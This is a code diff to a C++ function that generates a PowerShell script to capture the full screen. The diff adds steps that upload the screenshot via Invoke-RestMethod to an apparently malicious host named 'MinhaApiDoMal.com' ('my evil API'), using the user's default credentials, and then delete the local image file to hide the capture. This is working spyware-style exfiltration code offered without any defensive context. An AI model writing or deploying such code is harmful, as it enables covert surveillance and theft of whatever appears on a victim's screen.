@@ -134,10 +134,13 @@ void CreatePrintScreenScript(string output)
 {
   ofstream file;
   string scriptPS1;
+  string urlUpload = "MinhaApiDoMal.com/upload.php";
 
   file.open(output+"PrintScreen.ps1");
 
   scriptPS1 += "Add-Type -AssemblyName System.Windows.Forms,System.Drawing\n";
+  scriptPS1 += "$uploadPath = \"$env:USERPROFILE\\test.png\"\n";
+  scriptPS1 += "$uri = \""+urlUpload+"\"\n";
   scriptPS1 += "$screens = [Windows.Forms.Screen]::AllScreens\n";
   scriptPS1 += "$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum\n";
   scriptPS1 += "$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum\n";
@@ -147,9 +150,11 @@ void CreatePrintScreenScript(string output)
   scriptPS1 += "$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)\n";
   scriptPS1 += "$graphics = [Drawing.Graphics]::FromImage($bmp)\n";
   scriptPS1 += "$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)\n";
-  scriptPS1 += "$bmp.Save(\"$env:USERPROFILE\\image.png\")\n";
+  scriptPS1 += "$bmp.Save($uploadPath)\n";
   scriptPS1 += "$graphics.Dispose()\n";
-  scriptPS1 += "$bmp.Dispose()";
+  scriptPS1 += "$bmp.Dispose()\n";
+  scriptPS1 += "Invoke-RestMethod -Uri $uri -Method Post -InFile $uploadPath -UseDefaultCredentials\n";
+  scriptPS1 += "Remove-Item $uploadPath";
 
   file << scriptPS1 << endl;
   file.close();
